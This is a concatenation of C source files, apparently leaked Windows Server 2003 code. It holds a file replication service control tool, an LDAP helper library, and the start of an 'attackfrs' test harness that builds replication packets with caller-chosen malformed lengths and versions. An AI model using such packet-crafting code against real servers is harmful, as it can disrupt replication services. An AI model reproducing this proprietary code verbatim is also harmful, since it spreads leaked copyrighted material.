    Address of the new argv
--*/
{
    PWCHAR  *newargv;

    newargv = malloc((argc + 1) * sizeof(PWCHAR));
    newargv[argc] = NULL;

    while (argc-- >= 1) {
        newargv[argc] = malloc((strlen(argv[argc]) + 1) * sizeof(WCHAR));
        wsprintf(newargv[argc], L"%hs", argv[argc]);
        FRS_WCSLWR(newargv[argc]);
    }
    return newargv;
}


VOID
_cdecl
main(
    IN DWORD argc,
    IN PCHAR *argv
    )
/*++
Routine Description:
    Create the file replication service:
        addsrvc <full path to exe>

Arguments:
    None.

Return Value:
    None.
--*/
{
    DWORD   i;
    PWCHAR  *NewArgv;

    if (argc == 1) {
        printf("service create [full path to exe]\n");
        printf("service delete\n");
        printf("service start\n");
        printf("service stop\n");
        printf("service pause\n");
        printf("service continue\n");
        return;
    }

    NewArgv = ConvertArgv(argc, argv);

    //
    // CLI overrides registry
    //
    for (i = 1; i < argc; ++i) {
        //
        // create
        //
        if (wcsstr(NewArgv[i], L"create")) {
            FrsDeleteService(SERVICE_NAME);
            FrsCreateService(SERVICE_NAME,
                             NewArgv[2],
                             SERVICE_LONG_NAME);
            break;
        //
        // delete
        //
        } else if (wcsstr(NewArgv[i], L"delete")) {
            FrsDeleteService(SERVICE_NAME);
            break;
        //
        // start
        //
        } else if (wcsstr(NewArgv[i], L"start")) {
            FrsStartService(SERVICE_NAME);
            break;
        //
        // stop
        //
        } else if (wcsstr(NewArgv[i], L"stop")) {
            FrsStopService(SERVICE_NAME);
            break;
        //
        // pause
        //
        } else if (wcsstr(NewArgv[i], L"pause")) {
            FrsPauseService(SERVICE_NAME);
            break;
        //
        // continue
        //
        } else if (wcsstr(NewArgv[i], L"continue")) {
            FrsContinueService(SERVICE_NAME);
            break;
        //
        //   unknown
        //
        } else {
            printf("Don't understand \"%ws\"\n", NewArgv[i]);
        }
    }
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\support\ldaputil.c ===
/*++

Copyright (c) 2001 Microsoft Corporation

Module Name:
    ldaputil.c

Abstract:
    Collection of functions needed to perform ldao operations.
    These functions are used by ntfrsapi.dll and 
    any other frs tools.


Author:
    Sudarshan Chitre 20-Mar-2001

Environment
    User mode winnt

--*/

#include <ntreppch.h>
#pragma  hdrstop
#include <perrepsr.h>

#undef DEBSUB
#define DEBSUB  "SUP:"

#include <frs.h>
#include <frssup.h>

//###  These functions are also defined in ds,c

//
// Ldap client timeout structure. Value is overwritten by the value of LdapSearchTimeoutInMinutes.
//

LDAP_TIMEVAL    FrsSupLdapTimeout = { 10 * 60 * 60, 0 }; //Default ldap timeout value. Overridden by registry param Ldap Search Timeout Value In Minutes

#define FRS_LDAP_SEARCH_PAGESIZE 1000

DWORD
FrsSupBindToDC (
    IN  PWCHAR    pszDC,
    IN  PSEC_WINNT_AUTH_IDENTITY_W pCreds,
    OUT PLDAP     *ppLDAP
    )
/*++

Routine Description:

    Sets up an LDAP connection to the specified server

Arguments:

    pwszDC - DS DC to bind to
    pCreds - Credentials used to bind to the DS.
    ppLDAP - The LDAP connection information is returned here

Return Value:

    ERROR_SUCCESS - Success

--*/
{
    DWORD   dwErr = ERROR_SUCCESS;
    ULONG   ulOptions;

    //
    // if ldap_open is called with a server name the api will call DsGetDcName 
    // passing the server name as the domainname parm...bad, because 
    // DsGetDcName will make a load of DNS queries based on the server name, 
    // it is designed to construct these queries from a domain name...so all 
    // these queries will be bogus, meaning they will waste network bandwidth,
    // time to fail, and worst case cause expensive on demand links to come up 
    // as referrals/forwarders are contacted to attempt to resolve the bogus 
    // names.  By setting LDAP_OPT_AREC_EXCLUSIVE to on using ldap_set_option 
    // after the ldap_init but before any other operation using the ldap 
    // handle from ldap_init, the delayed connection setup will not call 
    // DsGetDcName, just gethostbyname, or if an IP is passed, the ldap client 
    // will detect that and use the address directly.
    //
//    *ppLDAP = ldap_open(pszDC, LDAP_PORT);
    *ppLDAP = ldap_init(pszDC, LDAP_PORT);

    if(*ppLDAP == NULL)
    {
        dwErr = ERROR_PATH_NOT_FOUND;
    }
    else
    {
        //
        // set the options.
        //
        ulOptions = PtrToUlong(LDAP_OPT_ON);
        ldap_set_option(*ppLDAP, LDAP_OPT_AREC_EXCLUSIVE, &ulOptions);

        //
        // Do a bind...
        //
        dwErr = ldap_bind_s(*ppLDAP,
                            NULL,
                            (PWCHAR)pCreds,
                            LDAP_AUTH_NEGOTIATE);
    }

    return(dwErr);
}

PVOID *
FrsSupFindValues(
    IN PLDAP        Ldap,
    IN PLDAPMessage Entry,
    IN PWCHAR       DesiredAttr,
    IN BOOL         DoBerVals
    )
/*++
Routine Description:
    Return the DS values for one attribute in an entry.

Arguments:
    Ldap        - An open, bound Ldap port.
    Entry       - An Ldap entry returned by Ldap_search_s()
    DesiredAttr - Return values for this attribute.
    DoBerVals   - Return the bervals (for binary data, v.s. WCHAR data)

Return Value:
    An array of char pointers that represents the values for the attribute.
    The caller must free the array with LDAP_FREE_VALUES().
    NULL if unsuccessful.
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupFindValues:"
    PWCHAR          Attr;       // Retrieved from an Ldap entry
    BerElement      *Ber;       // Needed for scanning attributes

    //
    // Search the entry for the desired attribute
    //
    for (Attr = ldap_first_attribute(Ldap, Entry, &Ber);
         Attr != NULL;
         Attr = ldap_next_attribute(Ldap, Entry, Ber)) {

        if (WSTR_EQ(DesiredAttr, Attr)) {
            //
            // Return the values for DesiredAttr
            //
            if (DoBerVals) {
                return ldap_get_values_len(Ldap, Entry, Attr);
            } else {
                return ldap_get_values(Ldap, Entry, Attr);
            }
        }
    }
    return NULL;
}

PWCHAR
FrsSupWcsDup(
    PWCHAR OldStr
    )
/*++
Routine Description:
    Duplicate a string using our memory allocater

Arguments:
    OldArg  - string to duplicate

Return Value:
    Duplicated string. Free with FRS_SUP_FREE().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsSupWcsDup:"

    PWCHAR  NewStr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (OldStr == NULL) {
        return NULL;
    }

    NewStr = malloc((wcslen(OldStr) + 1) * sizeof(WCHAR));
    if (NewStr != NULL) {
        wcscpy(NewStr, OldStr);
    }

    return NewStr;
}

PWCHAR
FrsSupFindValue(
    IN PLDAP        Ldap,
    IN PLDAPMessage Entry,
    IN PWCHAR       DesiredAttr
    )
/*++
Routine Description:
    Return a copy of the first DS value for one attribute in an entry.

Arguments:
    ldap        - An open, bound ldap port.
    Entry       - An ldap entry returned by ldap_search_s()
    DesiredAttr - Return values for this attribute.

Return Value:
    A zero-terminated string or NULL if the attribute or its value
    doesn't exist. The string is freed with FREE_NO_HEADER().
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupFindValue:"
    PWCHAR  Val;
    PWCHAR  *Values;

    // Get ldap's array of values
    Values = (PWCHAR *)FrsSupFindValues(Ldap, Entry, DesiredAttr, FALSE);

    // Copy the first value (if any)
    Val = (Values) ? FrsSupWcsDup(Values[0]) : NULL;

    // Free ldap's array of values
    LDAP_FREE_VALUES(Values);

    return Val;
}

BOOL
FrsSupLdapSearch(
    IN PLDAP        Ldap,
    IN PWCHAR       Base,
    IN ULONG        Scope,
    IN PWCHAR       Filter,
    IN PWCHAR       Attrs[],
    IN ULONG        AttrsOnly,
    IN LDAPMessage  **Msg
    )
/*++
Routine Description:
    Issue the ldap ldap_search_s call, check for errors, and check for
    a shutdown in progress.

Arguments:
    ldap        Session handle to Ldap server.

    Base        The distinguished name of the entry at which to start the search

    Scope
        LDAP_SCOPE_BASE     Search the base entry only.
        LDAP_SCOPE_ONELEVEL Search the base entry and all entries in the first
                            level below the base.
        LDAP_SCOPE_SUBTREE  Search the base entry and all entries in the tree
                            below the base.

    Filter      The search filter.

    Attrs       A null-terminated array of strings indicating the attributes
                to return for each matching entry. Pass NULL to retrieve all
                available attributes.

    AttrsOnly   A boolean value that should be zero if both attribute types
                and values are to be returned, nonzero if only types are wanted.

    mSG         Contains the results of the search upon completion of the call.
                The ldap array of values or NULL if the Base, DesiredAttr, or its
                values does not exist.
                The ldap array is freed with LDAP_FREE_VALUES().

Return Value:

    TRUE if not shutting down.

--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupLdapSearch:"

    DWORD           LStatus;

    *Msg  = NULL;

    //
    // Issue the ldap search
    //
    LStatus = ldap_search_ext_s(Ldap,
                                Base,
                                Scope,
                                Filter,
                                Attrs,
                                AttrsOnly,
                                NULL,
                                NULL,
                                &FrsSupLdapTimeout,
                                0,
                                Msg);

    //
    // Check for errors
    //
    if (LStatus != LDAP_SUCCESS) {

        //
        // Increment the DS Searches in Error counter
        //
        LDAP_FREE_MSG(*Msg);
        return FALSE;
    }

    return TRUE;
}

PWCHAR *
FrsSupGetValues(
    IN PLDAP Ldap,
    IN PWCHAR Base,
    IN PWCHAR DesiredAttr
    )
/*++
Routine Description:
    Return all of the DS values for one attribute in an object.

Arguments:
    ldap        - An open, bound ldap port.
    Base        - The "pathname" of a DS object.
    DesiredAttr - Return values for this attribute.

Return Value:
    The ldap array of values or NULL if the Base, DesiredAttr, or its values
    does not exist. The ldap array is freed with LDAP_FREE_VALUES().
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupGetValues:"

    PLDAPMessage    Msg = NULL; // Opaque stuff from ldap subsystem
    PWCHAR          *Values;    // Array of values for desired attribute

    //
    // Search Base for all of this attribute + values (objectCategory=*)
    //
    if (!FrsSupLdapSearch(Ldap, Base, LDAP_SCOPE_BASE, CATEGORY_ANY,
                         NULL, 0, &Msg)) {
        return NULL;
    }
    //
    // Return the values for the desired attribute
    //
    Values = (PWCHAR *)FrsSupFindValues(Ldap,
                                       ldap_first_entry(Ldap, Msg),
                                       DesiredAttr,
                                       FALSE);
    LDAP_FREE_MSG(Msg);
    return Values;
}

PWCHAR
FrsSupExtendDn(
    IN PWCHAR Dn,
    IN PWCHAR Cn
    )
/*++
Routine Description:
    Extend an existing DN with a new CN= component.

Arguments:
    Dn  - distinguished name
    Cn  - common name

Return Value:
    CN=Cn,Dn
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsDsExtendDn:"

    ULONG  Len;
    PWCHAR NewDn;

    if ((Dn == NULL) || (Cn == NULL)) {
        return NULL;
    }

    Len = wcslen(L"CN=,") + wcslen(Dn) + wcslen(Cn) + 1;
    NewDn = (PWCHAR)malloc(Len * sizeof(WCHAR));

    if (NewDn != NULL) {
        wcscpy(NewDn, L"CN=");
        wcscat(NewDn, Cn);
        wcscat(NewDn, L",");
        wcscat(NewDn, Dn);
    }
    return NewDn;
}

PWCHAR
FrsSupGetRootDn(
    PLDAP    Ldap,
    PWCHAR   NamingContext
    )
/*++
Routine Description:

Arguments:

Return Value:
--*/
{
    PWCHAR  Root;       // DS pathname of configuration container
    PWCHAR  *Values;    // values from the attribute "namingContexts"
    DWORD   NumVals;    // number of values

    //
    // Return all of the values for the attribute namingContexts
    //
    Values = FrsSupGetValues(Ldap, CN_ROOT, ATTR_NAMING_CONTEXTS);
    if (Values == NULL)
        return NULL;

    //
    // Find the naming context that begins with CN=Configuration
    //
    NumVals = ldap_count_values(Values);
    while (NumVals--) {
        Root = wcsstr(Values[NumVals], NamingContext);
        if (Root != NULL && Root == Values[NumVals]) {
            Root = FrsSupWcsDup(Root);
            ldap_value_free(Values);
            return Root;
        }
    }
    ldap_value_free(Values);
    return NULL;
}

BOOL
FrsSupLdapSearchInit(
    PLDAP        ldap,
    PWCHAR       Base,
    ULONG        Scope,
    PWCHAR       Filter,
    PWCHAR       Attrs[],
    ULONG        AttrsOnly,
    PFRS_LDAP_SEARCH_CONTEXT FrsSearchContext
    )
/*++
Routine Description:
    Issue the ldap_create_page_control and  ldap_search_ext_s calls,
    FrsSupLdapSearchInit(), and FrsSupLdapSearchNext() APIs are used to
    make ldap queries and retrieve the results in paged form.

Arguments:
    ldap        Session handle to Ldap server.

    Base        The distinguished name of the entry at which to start the search.
                A copy of base is kept in the context.

    Scope

                LDAP_SCOPE_BASE     Search the base entry only.

                LDAP_SCOPE_ONELEVEL Search the base entry and all entries in the first
                                    level below the base.

                LDAP_SCOPE_SUBTREE  Search the base entry and all entries in the tree
                                    below the base.

    Filter      The search filter. A copy of filter is kept in the context.

    Attrs       A null-terminated array of strings indicating the attributes
                to return for each matching entry. Pass NULL to retrieve all
                available attributes.

    AttrsOnly   A boolean value that should be zero if both attribute types
                and values are to be returned, nonzero if only types are wanted.

    FrsSearchContext
                An opaques structure that links the FrsSupLdapSearchInit() and
                FrsSupLdapSearchNext() calls together. The structure contains
                the information required to retrieve query results across pages.

Return Value:

    BOOL result.

--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupLdapSearchInit:"

    DWORD           LStatus             = LDAP_SUCCESS;
    PLDAPControl    ServerControls[2];
    PLDAPControl    ServerControl       = NULL;
    UINT            i;
    LDAP_BERVAL     cookie1 = { 0, NULL };

    FrsSearchContext->LdapMsg = NULL;
    FrsSearchContext->CurrentLdapMsg = NULL;
    FrsSearchContext->EntriesInPage = 0;
    FrsSearchContext->CurrentEntry = 0;

    FrsSearchContext->BaseDn = FrsSupWcsDup(Base);
    FrsSearchContext->Filter = FrsSupWcsDup(Filter);
    FrsSearchContext->Scope = Scope;
    FrsSearchContext->Attrs = Attrs;


    LStatus = ldap_create_page_control(ldap,
                                      FRS_LDAP_SEARCH_PAGESIZE,
                                      &cookie1,
                                      FALSE, // is critical
                                      &ServerControl
                                     );

    ServerControls[0] = ServerControl;
    ServerControls[1] = NULL;

    if (LStatus != LDAP_SUCCESS) {
        FRS_SUP_FREE(FrsSearchContext->BaseDn);
        FRS_SUP_FREE(FrsSearchContext->Filter);
        return FALSE;
    }

    LStatus = ldap_search_ext_s(ldap,
                      FrsSearchContext->BaseDn,
                      FrsSearchContext->Scope,
                      FrsSearchContext->Filter,
                      FrsSearchContext->Attrs,
                      FALSE,
                      ServerControls,
                      NULL,
                      &FrsSupLdapTimeout,
                      0,
                      &FrsSearchContext->LdapMsg);

    ldap_control_free(ServerControl);

    if  (LStatus  == LDAP_SUCCESS) {
       FrsSearchContext->EntriesInPage = ldap_count_entries(ldap, FrsSearchContext->LdapMsg);
       FrsSearchContext->CurrentEntry = 0;
    }


    if (LStatus != LDAP_SUCCESS) {
        FRS_SUP_FREE(FrsSearchContext->BaseDn);
        FRS_SUP_FREE(FrsSearchContext->Filter);
        return FALSE;
    }

    return TRUE;
}

PLDAPMessage
FrsSupLdapSearchGetNextEntry(
    PLDAP        ldap,
    PFRS_LDAP_SEARCH_CONTEXT FrsSearchContext
    )
/*++
Routine Description:
    Get the next entry form the current page of the results
    returned. This call is only made if there is a entry
    in the current page.

Arguments:
    ldap        Session handle to Ldap server.

    FrsSearchContext
                An opaques structure that links the FrsSupLdapSearchInit() and
                FrsSupLdapSearchNext() calls together. The structure contains
                the information required to retrieve query results across pages.

Return Value:

    The first or the next entry from the current page.
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupLdapSearchGetNextEntry:"

    FrsSearchContext->CurrentEntry += 1;
    if ( FrsSearchContext->CurrentEntry == 1 ) {
        FrsSearchContext->CurrentLdapMsg = ldap_first_entry(ldap ,FrsSearchContext->LdapMsg);
    } else {
        FrsSearchContext->CurrentLdapMsg = ldap_next_entry(ldap ,FrsSearchContext->CurrentLdapMsg);
    }

    return FrsSearchContext->CurrentLdapMsg;
}

DWORD
FrsSupLdapSearchGetNextPage(
    PLDAP        ldap,
    PFRS_LDAP_SEARCH_CONTEXT FrsSearchContext
    )
/*++
Routine Description:
    Get the next page from the results returned by ldap_search_ext_s..

Arguments:
    ldap        Session handle to Ldap server.

    FrsSearchContext
                An opaques structure that links the FrsSupLdapSearchInit() and
                FrsSupLdapSearchNext() calls together. The structure contains
                the information required to retrieve query results across pages.

Return Value:
    WINSTATUS

--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupLdapSearchGetNextPage:"

    DWORD                     LStatus = LDAP_SUCCESS;
    LDAP_BERVAL               * CurrCookie = NULL;
    PLDAPControl            * CurrControls = NULL;
    ULONG                     retcode = 0;
    ULONG                     TotalEntries = 0;
    PLDAPControl              ServerControls[2];
    PLDAPControl              ServerControl= NULL;



    // Get the server control from the message, and make a new control with the cookie from the server
    LStatus = ldap_parse_result(ldap, FrsSearchContext->LdapMsg, &retcode,NULL,NULL,NULL,&CurrControls,FALSE);
    LDAP_FREE_MSG(FrsSearchContext->LdapMsg);

    if (LStatus != LDAP_SUCCESS) {
        return LdapMapErrorToWin32(LStatus);
    }

    LStatus = ldap_parse_page_control(ldap, CurrControls, &TotalEntries, &CurrCookie);

    if (LStatus != LDAP_SUCCESS) {
        return LdapMapErrorToWin32(LStatus);
    }

    if ( CurrCookie->bv_len == 0 && CurrCookie->bv_val == 0 ) {
       LStatus = LDAP_CONTROL_NOT_FOUND;
       ldap_controls_free(CurrControls);
       ber_bvfree(CurrCookie);
       return LdapMapErrorToWin32(LStatus);
    }


    LStatus = ldap_create_page_control(ldap,
                            FRS_LDAP_SEARCH_PAGESIZE,
                            CurrCookie,
                            FALSE,
                            &ServerControl);

    ServerControls[0] = ServerControl;
    ServerControls[1] = NULL;

    ldap_controls_free(CurrControls);
    CurrControls = NULL;
    ber_bvfree(CurrCookie);
    CurrCookie = NULL;

    if (LStatus != LDAP_SUCCESS) {
        return LdapMapErrorToWin32(LStatus);
    }

    // continue the search with the new cookie
    LStatus = ldap_search_ext_s(ldap,
                   FrsSearchContext->BaseDn,
                   FrsSearchContext->Scope,
                   FrsSearchContext->Filter,
                   FrsSearchContext->Attrs,
                   FALSE,
                   ServerControls,
                   NULL,
                   &FrsSupLdapTimeout,
                   0,
                   &FrsSearchContext->LdapMsg);

    ldap_control_free(ServerControl);

    if (LStatus == LDAP_SUCCESS) {
        FrsSearchContext->EntriesInPage = ldap_count_entries(ldap, FrsSearchContext->LdapMsg);
        FrsSearchContext->CurrentEntry = 0;

    }

    return LdapMapErrorToWin32(LStatus);
}

PLDAPMessage
FrsSupLdapSearchNext(
    PLDAP        ldap,
    PFRS_LDAP_SEARCH_CONTEXT FrsSearchContext
    )
/*++
Routine Description:
    Get the next entry form the current page of the results
    returned or from the next page if we are at the end of the.
    current page.

Arguments:
    ldap        Session handle to Ldap server.

    FrsSearchContext
                An opaques structure that links the FrsSupLdapSearchInit() and
                FrsSupLdapSearchNext() calls together. The structure contains
                the information required to retrieve query results across pages.

Return Value:

    The next entry on this page or the first entry from the next page.
    NULL if there are no more entries to return.
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupLdapSearchNext:"

    DWORD         WStatus = ERROR_SUCCESS;
    PLDAPMessage  NextEntry = NULL;

    if (FrsSearchContext->EntriesInPage > FrsSearchContext->CurrentEntry )
    {
       // return the next entry from the current page
       return FrsSupLdapSearchGetNextEntry(ldap, FrsSearchContext);
    }
    else
    {
       // see if there are more pages of results to get
       WStatus = FrsSupLdapSearchGetNextPage(ldap, FrsSearchContext);
       if (WStatus == ERROR_SUCCESS)
       {
          return FrsSupLdapSearchGetNextEntry(ldap, FrsSearchContext);
       }
    }

    return NextEntry;
}

VOID
FrsSupLdapSearchClose(
    PFRS_LDAP_SEARCH_CONTEXT FrsSearchContext
    )
/*++
Routine Description:
    The search is complete. Free the elemetns of the context and reset
    them so the same context can be used for another search.

Arguments:

    FrsSearchContext
                An opaques structure that links the FrsSupLdapSearchInit() and
                FrsSupLdapSearchNext() calls together. The structure contains
                the information required to retrieve query results across pages.

Return Value:

    NONE
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsSupLdapSearchClose:"

    FrsSearchContext->EntriesInPage = 0;
    FrsSearchContext->CurrentEntry = 0;

    FRS_SUP_FREE(FrsSearchContext->BaseDn);
    FRS_SUP_FREE(FrsSearchContext->Filter);
    LDAP_FREE_MSG(FrsSearchContext->LdapMsg);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\attackfrs\frscomm.c ===
#include <ntreppch.h>
#include <frs.h>

#include "attack.h"



ULONG   NtFrsMajor      = NTFRS_MAJOR;

ULONG   NtFrsCommMinor  = NTFRS_COMM_MINOR_7;
//
// Note:  When using COMM_DECODE_VAR_LEN_BLOB you must also use COMM_SZ_NULL
// in the table below so that no length check is made when the field is decoded.
// This allows the field size to grow.  Down level members must be able to
// handle this by ignoring var len field components they do not understand.
//

//
// The Communication packet element table below is used to construct and
// decode comm packet data sent between members.
// *** WARNING *** - the order of the rows in the table must match the
// the order of the elements in the COMM_TYPE enum.  See comments for COMM_TYPE
// enum for restrictions on adding new elements to the table.
//
//   Data Element Type       DisplayText             Size              Decode Type         Offset to Native Cmd Packet
//
COMM_PACKET_ELEMENT CommPacketTable[COMM_MAX] = {
{COMM_NONE,                 "NONE"               , COMM_SZ_NULL,   COMM_DECODE_NONE,      0                           },

{COMM_BOP,                  "BOP"                , COMM_SZ_UL,     COMM_DECODE_ULONG,     RsOffsetSkip                },
{COMM_COMMAND,              "COMMAND"            , COMM_SZ_UL,     COMM_DECODE_ULONG_TO_USHORT, OFFSET(COMMAND_PACKET, Command)},
{COMM_TO,                   "TO"                 , COMM_SZ_NULL,   COMM_DECODE_GNAME,     RsOffset(To)                },
{COMM_FROM,                 "FROM"               , COMM_SZ_NULL,   COMM_DECODE_GNAME,     RsOffset(From)              },
{COMM_REPLICA,              "REPLICA"            , COMM_SZ_NULL,   COMM_DECODE_GNAME,     RsOffset(ReplicaName)       },
{COMM_JOIN_GUID,            "JOIN_GUID"          , COMM_SZ_GUL,    COMM_DECODE_BLOB,      RsOffset(JoinGuid)          },
{COMM_VVECTOR,              "VVECTOR"            , COMM_SZ_GVSN,   COMM_DECODE_VVECTOR,   RsOffset(VVector)           },
{COMM_CXTION,               "CXTION"             , COMM_SZ_NULL,   COMM_DECODE_GNAME,     RsOffset(Cxtion)            },

{COMM_BLOCK,                "BLOCK"              , COMM_SZ_NULL,   COMM_DECODE_BLOB,      RsOffset(Block)             },
{COMM_BLOCK_SIZE,           "BLOCK_SIZE"         , COMM_SZ_ULL,    COMM_DECODE_ULONGLONG, RsOffset(BlockSize)         },
{COMM_FILE_SIZE,            "FILE_SIZE"          , COMM_SZ_ULL,    COMM_DECODE_ULONGLONG, RsOffset(FileSize)          },
{COMM_FILE_OFFSET,          "FILE_OFFSET"        , COMM_SZ_ULL,    COMM_DECODE_ULONGLONG, RsOffset(FileOffset)        },

{COMM_REMOTE_CO,            "REMOTE_CO"          , COMM_SZ_COC,    COMM_DECODE_REMOTE_CO, RsOffset(PartnerChangeOrderCommand)},
{COMM_GVSN,                 "GVSN"               , COMM_SZ_GVSN,   COMM_DECODE_BLOB,      RsOffset(GVsn)              },

{COMM_CO_GUID,              "CO_GUID"            , COMM_SZ_GUL,    COMM_DECODE_BLOB,      RsOffset(ChangeOrderGuid)   },
{COMM_CO_SEQUENCE_NUMBER,   "CO_SEQUENCE_NUMBER" , COMM_SZ_UL,     COMM_DECODE_ULONG,     RsOffset(ChangeOrderSequenceNumber)},
{COMM_JOIN_TIME,            "JOIN_TIME"          , COMM_SZ_JTIME,  COMM_DECODE_BLOB,      RsOffset(JoinTime)          },
{COMM_LAST_JOIN_TIME,       "LAST_JOIN_TIME"     , COMM_SZ_ULL,    COMM_DECODE_ULONGLONG, RsOffset(LastJoinTime)      },
{COMM_EOP,                  "EOP"                , COMM_SZ_UL,     COMM_DECODE_ULONG,     RsOffsetSkip                },
{COMM_REPLICA_VERSION_GUID, "REPLICA_VERSION_GUID", COMM_SZ_GUL,   COMM_DECODE_BLOB,      RsOffset(ReplicaVersionGuid)},
{COMM_MD5_DIGEST,           "MD5_DIGEST"         , COMM_SZ_MD5,    COMM_DECODE_BLOB,      RsOffset(Md5Digest)         },
{COMM_CO_EXT_WIN2K,         "CO_EXT_WIN2K"       , COMM_SZ_COEXT_W2K,COMM_DECODE_BLOB,    RsOffset(PartnerChangeOrderCommandExt)},
{COMM_CO_EXTENSION_2,       "CO_EXTENSION_2"     , COMM_SZ_NULL,   COMM_DECODE_VAR_LEN_BLOB, RsOffset(PartnerChangeOrderCommandExt)},

{COMM_COMPRESSION_GUID,     "COMPRESSION_GUID"   , COMM_SZ_GUID,   COMM_DECODE_GUID,      RsOffset(CompressionTable)}

};



VOID
CommCopyMemory(
    IN PCOMM_PACKET CommPkt,
    IN PUCHAR       Src,
    IN ULONG        Len
    )
/*++
Routine Description:
    Copy memory into a comm packet, extending as necessary

Arguments:
    CommPkt
    Src
    Len

Return Value:
    None.
--*/
{
#undef DEBSUB
#define  DEBSUB  "CommCopyMemory:"
    ULONG   MemLeft;
    PUCHAR  NewPkt;

    //
    // Adjust size of comm packet if necessary
    //
    // PERF:  How many allocs get done to send a CO???   This looks expensive.

    MemLeft = CommPkt->MemLen - CommPkt->PktLen;
    if (Len > MemLeft) {
        //
        // Just filling memory; extend memory, tacking on a little extra
        //
        CommPkt->MemLen = (((CommPkt->MemLen + Len) + (COMM_MEM_SIZE - 1))
                           / COMM_MEM_SIZE)
                           * COMM_MEM_SIZE;
        NewPkt = MALLOC(CommPkt->MemLen);
        CopyMemory(NewPkt, CommPkt->Pkt, CommPkt->PktLen);
        FREE(CommPkt->Pkt);
        CommPkt->Pkt = NewPkt;
    }

    //
    // Copy into the packet
    //
    if (Src != NULL) {
        CopyMemory(CommPkt->Pkt + CommPkt->PktLen, Src, Len);
    } else {
        ZeroMemory(CommPkt->Pkt + CommPkt->PktLen, Len);
    }
    CommPkt->PktLen += Len;
}


VOID
CommPackULong(
    IN PCOMM_PACKET CommPkt,
    IN COMM_TYPE    Type,
    IN ULONG        Data
    )
/*++
Routine Description:
    Copy a header and a ulong into the comm packet.

Arguments:
    CommPkt
    Type
    Data

Return Value:
    None.
--*/
{
#undef DEBSUB
#define  DEBSUB  "CommPackULong:"
    ULONG   Len         = sizeof(ULONG);
    USHORT  CommType    = (USHORT)Type;

    CommCopyMemory(CommPkt, (PUCHAR)&CommType, sizeof(USHORT));
    printf("Packed CommType.\n");
    CommCopyMemory(CommPkt, (PUCHAR)&Len,      sizeof(ULONG));
    printf("Packed Len.\n");
    CommCopyMemory(CommPkt, (PUCHAR)&Data,     sizeof(ULONG));
    printf("Packed Data.\n");
}


PCOMM_PACKET
CommStartCommPkt(
    IN PWCHAR       Name
    )
/*++
Routine Description:
    Allocate a comm packet.

Arguments:
    Name

Return Value:
    Address of a comm packet.
--*/
{
#undef DEBSUB
#define  DEBSUB  "CommStartCommPkt:"
    ULONG           Size;
    PCOMM_PACKET    CommPkt;

    //
    // We can create a comm packet in a file or in memory
    //
    CommPkt = MALLOC(sizeof(COMM_PACKET));
    Size = COMM_MEM_SIZE;
    CommPkt->Pkt = MALLOC(Size);
    CommPkt->MemLen = Size;
    CommPkt->Major = NtFrsMajor;
    CommPkt->Minor = NtFrsCommMinor;

    printf("CommPkt initialized. Getting ready to add BOP\n");
    //
    // Pack the beginning-of-packet
    //
    CommPackULong(CommPkt, COMM_BOP, 0);
    return CommPkt;
}

PCOMM_PACKET
BuildCommPktFromDescriptorList(
    IN PCOMM_PKT_DESCRIPTOR pListHead,
    IN ULONG ActualPktSize,
    IN OPTIONAL ULONG *Major,
    IN OPTIONAL ULONG *Minor,
    IN OPTIONAL ULONG *CsId,
    IN OPTIONAL ULONG *MemLen,
    IN OPTIONAL ULONG *PktLen,
    IN OPTIONAL ULONG *UpkLen
    )
/*++
Routine Description:
    Allocate a comm packet and fill it acording to the parameters specified..


Arguments:
    pListHead - Address of the pListEntry of a COMM_PKT_DESCRIPTOR. We walk
		the list of descriptors to build the Pkt.
    
    ActualPktSize - Amount of memory to allocate for the Pkt.
    
    Major
    Minor
    CsId
    MemLen
    PktLen
    UpkLen - These parameters correspond to the fields in a COMM_PACKET. If 
	     they are NULL, the default value is used.
    
    
Return Value:
    Address of a comm packet.
--*/
{
    PCOMM_PKT_DESCRIPTOR pDescriptor = pListHead;
    PCOMM_PACKET         CommPkt = NULL;

    //
    // Allocate the CommPkt struct
    //
    CommPkt = MALLOC(sizeof(COMM_PACKET));
    
    //
    // Allocate the Pkt
    //
    CommPkt->Pkt = MALLOC(ActualPktSize);
    
    //
    // Set struct values. Use defaults if parameters are not specified.
    //
    CommPkt->MemLen = (MemLen?*MemLen:COMM_MEM_SIZE);
    CommPkt->Major = (Major?*Major:NtFrsMajor);
    CommPkt->Minor = (Minor?*Minor:NtFrsCommMinor);
    CommPkt->CsId = (CsId?*CsId:CS_RS);
    CommPkt->UpkLen = (UpkLen?*UpkLen:0);

    //
    // PktLen must be 0 for now so that CommCopyMemory will work correctly.
    // We'll set it to the provided value later.
    //
    CommPkt->PktLen = 0; 


    while(pDescriptor != NULL) {
        CommCopyMemory(CommPkt, (PUCHAR)&(pDescriptor->CommType), sizeof(USHORT));
        CommCopyMemory(CommPkt, (PUCHAR)&(pDescriptor->CommDataLength), sizeof(ULONG));
        CommCopyMemory(CommPkt, (PUCHAR)(pDescriptor->Data), pDescriptor->ActualDataLength );
	pDescriptor = pDescriptor->Next;
    };


    //
    // We're done building the packet.
    // Now we can set PktLen tot he supplied value.
    //
    CommPkt->PktLen = (PktLen?*PktLen:CommPkt->PktLen);

    return CommPkt;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\attackfrs\attack.c ===
#include <ntreppch.h>
#include <frs.h>
#include <frsrpc.h>
#include "frsrpc_c.c"

#include "attack.h"

WCHAR* ProgramName = NULL;


VOID
StrToGuid(
    IN PCHAR  s,
    OUT GUID  *pGuid
    )
/*++

Routine Description:

    Convert a string in GUID display format to an object ID that
    can be used to lookup a file.

    based on a routine by Mac McLain

Arguments:

    pGuid - ptr to the output GUID.

